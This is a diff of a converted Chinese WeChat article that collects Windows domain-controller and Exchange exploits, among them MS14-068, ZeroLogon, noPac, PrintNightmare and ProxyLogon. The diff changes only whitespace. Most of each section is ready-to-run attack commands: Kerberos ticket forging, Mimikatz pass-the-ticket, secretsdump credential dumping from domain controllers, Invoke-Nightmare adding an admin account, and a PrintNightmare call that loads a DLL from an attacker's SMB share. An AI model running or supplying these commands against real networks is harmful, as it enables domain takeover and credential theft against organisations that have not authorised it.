@@ -7,7 +7,7 @@ cve: "CVE-2014-6324"
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Iex9QiyAWT9bdoAtsKgN-Q)
 
-     本文对近几年出现的 Windows 域控相关漏洞及利用方法进行整理，方便检测存在的漏洞，目前来看主要集中在本地权限提升、打印机服务利用、exchange 等。     
+     本文对近几年出现的 Windows 域控相关漏洞及利用方法进行整理，方便检测存在的漏洞，目前来看主要集中在本地权限提升、打印机服务利用、exchange 等。     
 =========================================================================================
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KZZyChGsoAXo3BSEicb6QdBvrTib2dibL3V8We7eXeib3quoZZSPW9fzQ7A/640?wx_fmt=jpeg)
@@ -15,7 +15,7 @@ cve: "CVE-2014-6324"
 1.1Kerberos 校验和漏洞 MS14-068(CVE-2014-6324)
 =========================================
 
-  Microsoft Windows Server 2003 SP2、Windows Vista SP2、Windows Server 2008 SP2 和 R2 SP1、Windows 7 SP1、Windows 8、Windows 8.1 以及 Windows Server 2012 Gold 和 R2 中的 Kerberos 密钥分发中心 (KDC) 允许经过身份验证的远程域用户通过票证中的伪造签名获得域管理员权限，2014 年 11 月在野外被利用，又名 “Kerberos 校验和漏洞”。
+  Microsoft Windows Server 2003 SP2、Windows Vista SP2、Windows Server 2008 SP2 和 R2 SP1、Windows 7 SP1、Windows 8、Windows 8.1 以及 Windows Server 2012 Gold 和 R2 中的 Kerberos 密钥分发中心 (KDC) 允许经过身份验证的远程域用户通过票证中的伪造签名获得域管理员权限，2014 年 11 月在野外被利用，又名 “Kerberos 校验和漏洞”。
 
 更新漏洞信息可以访问 https://nvd.nist.gov/vuln/detail/CVE-2014-6324
 
@@ -40,9 +40,9 @@ python ms14-068.py -u hx@demo.com -p pwd_of_hx -s S-1-5-21-3813283032-1038476579
 
 （4）获取管理员权限
 
-c:\User\123>Mimikatz.exe "kerberos::ptc TGT_hx@demo.com.ccache" exit      
+c:\User\123>Mimikatz.exe "kerberos::ptc TGT_hx@demo.com.ccache" exit      
 
-net use \\DCwin03\admin$  
+net use \\DCwin03\admin$  
 
 dir \\DCwin03\c$
 
@@ -69,7 +69,7 @@ https://github.com/maaaaz/impacket-examples-windows
 
 python3 cve-2020-1472.py DC01 DC01$ 192.168.204.136
 
-secretsdump.py evil.local/Administrador:BlackArrow123@192.168.204.136 -just-dc-user 'DC01$'  
+secretsdump.py evil.local/Administrador:BlackArrow123@192.168.204.136 -just-dc-user 'DC01$'  
 
 更多利用信息可以参考
 
@@ -158,7 +158,7 @@ fbinary = "/usr/bin/impacket-smbexec"
 
 if options.dump:
 
-   fbinary = "/usr/bin/impacket-secretsdump"
+   fbinary = "/usr/bin/impacket-secretsdump"
 
 2.noPac.py 利用
 
@@ -199,7 +199,7 @@ https://github.com/Ridter/CVE-2019-1040
 
 1. 利用方法
 
-python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip  python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip
+python CVE-2019-1040.py -ah attackterip -u user -p password -d domain.com -th DCip MailServerip  python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip
 
 ![](https://mmbiz.qpic.cn/mmbiz_jpg/icCXA7Jkf1VGXyST6AD0SJbPqicVte1ic7KyJ4DNelHibiax5KMIJwkh7uYUw1ut0NotkwVOeAqAZnIpgTrCia3gZKUw/640?wx_fmt=jpeg)
 
@@ -226,9 +226,9 @@ Attack Parrot (192.168.52.101)
 
 （1）利用方式 1
 
-python Exchange2domain.py -ah attackterip   -ap listenport -u user -p password -d domain.com -th DCip MailServerip  
+python Exchange2domain.py -ah attackterip   -ap listenport -u user -p password -d domain.com -th DCip MailServerip  
 
-python Exchange2domain.py -ah 192.168.52.101 -ap 80 -u attack -p "attack" -d qfdomain.com -th 192.168.52.3  192.168.52.4 --no-ssl
+python Exchange2domain.py -ah 192.168.52.101 -ap 80 -u attack -p "attack" -d qfdomain.com -th 192.168.52.3  192.168.52.4 --no-ssl
 
 （2）利用方式 2
 
@@ -242,7 +242,7 @@ python2 privexchange.py -ah 192.168.52.101 mail.qfdomain.com -u attack -p "attac
 
 获取 hash
 
-secretsdump.py evil.local/Administrador:BlackArrow123@192.168.52.3 -just-dc  
+secretsdump.py evil.local/Administrador:BlackArrow123@192.168.52.3 -just-dc  
 
   
 1.6Microsoft Exchange 反序列化 RCE（CVE-2020-0688）
@@ -257,7 +257,7 @@ https://github.com/zcgonvh/CVE-2020-0688
 1.7Windows Print Spooler 权限提升漏洞 CVE-2021-1675
 =============================================
 
- 该漏洞又被漏洞的作者称为 PrintNightmare，引发该漏洞的原因主要是因为当 Windows Print Spooler 服务（Windows 的打印机后台处理程序）不正确地执行特权文件操作时，存在远程执行代码漏洞风险。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新账户。攻击者可以通过该漏洞绕过 PfcAddPrinterDriver 的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到 DC 中的 Spooler 服务，并利用该漏洞在 DC 中安装恶意的驱动程序，完整的控制整个域环境。
+ 该漏洞又被漏洞的作者称为 PrintNightmare，引发该漏洞的原因主要是因为当 Windows Print Spooler 服务（Windows 的打印机后台处理程序）不正确地执行特权文件操作时，存在远程执行代码漏洞风险。成功利用此漏洞的攻击者可以使用 SYSTEM 权限运行任意代码。然后攻击者可以安装程序；查看、更改或删除数据；或创建具有完全用户权限的新账户。攻击者可以通过该漏洞绕过 PfcAddPrinterDriver 的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到 DC 中的 Spooler 服务，并利用该漏洞在 DC 中安装恶意的驱动程序，完整的控制整个域环境。
 
 https://nvd.nist.gov/vuln/detail/CVE-2021-1675
 
@@ -279,7 +279,7 @@ Invoke-Nightmare -DriverName "PrintTest" -NewUser "FakeZeeker" -NewPassword "123
 
 usage:
 
-CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share CVE-2021-1675 implementation. positional arguments:   target                [[domain/]username[:password]@]<targetName or address>   share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll' optional arguments:   -h, --help            show this help message and exit authentication:   -hashes LMHASH:NTHASH                         NTLM hashes, format is LMHASH:NTHASH connection:   -target-ip ip address                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name                         and you cannot resolve it   -port [destination port]                         Destination port to connect to SMB Server Example; ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'  
+CVE-2021-1675.py [-h] [-hashes LMHASH:NTHASH] [-target-ip ip address] [-port [destination port]] target share CVE-2021-1675 implementation. positional arguments:   target                [[domain/]username[:password]@]<targetName or address>   share                 Path to DLL. Example '\\10.10.10.10\share\evil.dll' optional arguments:   -h, --help            show this help message and exit authentication:   -hashes LMHASH:NTHASH                         NTLM hashes, format is LMHASH:NTHASH connection:   -target-ip ip address                         IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name                         and you cannot resolve it   -port [destination port]                         Destination port to connect to SMB Server Example; ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 '\\192.168.1.215\smb\addCube.dll' ./CVE-2021-1675.py hackit.local/domain_user:Pass123@192.168.1.10 'C:\addCube.dll'  
 
 1.8Exchange ProxyLogon 远程代码执行漏洞 CVE-2021-26855/CVE-2021-27065
 =============================================================
@@ -299,7 +299,7 @@ python proxylogon.py primary administrator@lab.local
 1.9Microsoft Exchange 远程代码执行漏洞 CVE-2020-17144
 =============================================
 
-     在微软最新发布的 12 月安全更新中公布了一个存在于 Microsoft Exchange Server2010 中的远程代码执行漏洞（CVE-2020-17144），官方定级 Important。漏洞是由程序未正确校验 cmdlet 参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。
+     在微软最新发布的 12 月安全更新中公布了一个存在于 Microsoft Exchange Server2010 中的远程代码执行漏洞（CVE-2020-17144），官方定级 Important。漏洞是由程序未正确校验 cmdlet 参数引起。经过身份验证的攻击者利用该漏洞可实现远程代码执行。
 
 原文链接：https://blog.csdn.net/m0_48520508/article/details/111934211
 
@@ -352,9 +352,9 @@ EXP/POC:
 
 https://github.com/bhdresh/CVE-2021-33766-ProxyToken
 
-./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>
+./proxytoken.sh -m <Mode> -s <Exchange Server IP>  -t <Target Email Address> -v <Victim Email Address>
 
-     本文所有工具已经下载到本地，请关注本公众号并添加微信号：lovesec2022 获取。
+     本文所有工具已经下载到本地，请关注本公众号并添加微信号：lovesec2022 获取。
 
 ---
 
